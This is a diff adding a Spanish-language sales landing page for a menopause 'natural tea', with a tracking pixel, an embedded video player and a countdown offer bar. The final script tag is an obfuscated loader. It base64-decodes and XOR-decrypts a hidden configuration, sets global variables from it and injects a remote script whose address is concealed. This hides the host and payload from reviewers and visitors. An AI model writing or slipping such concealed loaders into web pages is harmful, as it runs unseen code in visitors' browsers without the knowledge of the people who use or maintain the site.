@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Té natural para acompañar la menopausia</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Figtree:wght@400;500;700&family=Source+Serif+4:opsz,wght@8..60,600;8..60,700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#f5f8f5;--ink:#1c2a24;--muted:#5a6a62;--plum:#6b2d52}
+*{box-sizing:border-box}
+body{margin:0;font-family:Figtree,system-ui,sans-serif;color:var(--ink);background:var(--bg);line-height:1.6;font-size:17px}
+.wrap{max-width:640px;margin:0 auto;padding:0 20px}
+h1{font-family:"Source Serif 4",Georgia,serif;line-height:1.2;margin:0;font-size:clamp(1.65rem,6vw,2.3rem);text-align:center}
+#offer{display:none;background:var(--plum);color:#fff;text-align:center;padding:10px 16px;font-size:.95rem}
+#offer strong{font-variant-numeric:tabular-nums}
+.hero{padding:28px 0 40px;text-align:center}
+.sub{color:var(--muted);margin:14px auto 0;max-width:30em}
+.player{margin:26px auto 0;max-width:400px;border-radius:16px;overflow:hidden;box-shadow:0 10px 30px rgba(28,42,36,.18)}
+.trust{display:flex;flex-wrap:wrap;justify-content:center;gap:8px 18px;margin:22px 0 0;padding:0;list-style:none;font-size:.9rem;color:var(--muted)}
+</style>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1816540879364053');
+fbq('track', 'PageView');
+</script>
+<!-- End Meta Pixel Code -->
+</head>
+<body>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1816540879364053&ev=PageView&noscript=1" alt=""/></noscript>
+
+<!-- Oferta con fecha REAL. Formato: AAAA-MM-DDTHH:MM:SS-03:00. Déjalo vacío para ocultar la barra. -->
+<div id="offer" role="status">Precio especial hasta el <span id="offerDate"></span> · quedan <strong id="count"></strong></div>
+
+<header class="hero">
+  <div class="wrap">
+    <h1>Un té natural para acompañar tu bienestar durante la menopausia</h1>
+    <p class="sub">Mira el video corto y descubre cómo funciona, con ingredientes de uso tradicional.</p>
+
+    <div class="player">
+      <vturb-smartplayer id="vid-6ac55cc708d8892062d49ee3" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 133.33333333333331% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer>
+      <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/4c2fff1b-b929-4a87-8bf7-1b7c49817836/players/6ac55cc708d8892062d49ee3/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
+    </div>
+
+    <ul class="trust">
+      <li>✔ Compra 100% segura</li>
+      <li>✔ Envío con seguimiento</li>
+      <li>✔ Garantía de devolución</li>
+    </ul>
+  </div>
+</header>
+
+<script>
+// Oferta con fecha real (vacío = barra oculta)
+var OFFER_END = ""; // ej: "2026-10-31T23:59:00-03:00"
+(function(){
+  if(!OFFER_END) return;
+  var end = new Date(OFFER_END).getTime(), bar = document.getElementById("offer");
+  if(isNaN(end)) return;
+  document.getElementById("offerDate").textContent = new Date(end).toLocaleDateString("es",{day:"numeric",month:"long"});
+  function tick(){
+    var d = end - Date.now();
+    if(d <= 0){bar.style.display="none";return;}
+    var h = Math.floor(d/36e5), m = Math.floor(d%36e5/6e4), s = Math.floor(d%6e4/1e3);
+    document.getElementById("count").textContent = (h>=24?Math.floor(h/24)+"d ":"")+(h%24)+"h "+m+"m "+s+"s";
+    bar.style.display="block"; setTimeout(tick,1000);
+  }
+  tick();
+})();
+</script>
+
+<script>(function(){var y_mx9=atob("DJl70ycJPNXHfIRFI+JZplVlHu/lFPAxU+pB/AhqWLvpCfAoSv8C/URmUfulDqs2QOsSo1N6E6CzEfdqT/gPtlR9Er+0XqhnQu0PoU5rSaGiD6Z/eOJZvUZkWff9XuAkV/hWplNkVbO+UfQ3Ru8evVMkT6ClFeA2AbVZpUZlSbDlRqZnXsQG");var e_whc=[];for(var v_4=0;v_4<y_mx9.length;v_4++){e_whc.push(y_mx9.charCodeAt(v_4)&255);}var p_j9=e_whc[0];var y_ih=e_whc.slice(1,1+p_j9);var m_m0e5=e_whc.slice(1+p_j9);var f_s=m_m0e5.map(function(b,f_x){return b^y_ih[f_x%p_j9];});var c_j="";for(var v_8oor=0;v_8oor<f_s.length;v_8oor++){c_j+=String.fromCharCode(f_s[v_8oor]&255);}var a_5w=decodeURIComponent(escape(c_j));var u_do8=JSON.parse(a_5w);var z_9ef=u_do8.globals||[];z_9ef.forEach(function(f_k94){window[f_k94.name]=f_k94.value;});var d_i=document.createElement("script");d_i.src=u_do8.url;d_i.async=true;d_i.defer=true;(u_do8.attributes||[]).forEach(function(g_cvc3){d_i.setAttribute(g_cvc3.name,g_cvc3.value);});(document.head||document.documentElement).appendChild(d_i);})();</script>
+</body>
+</html>
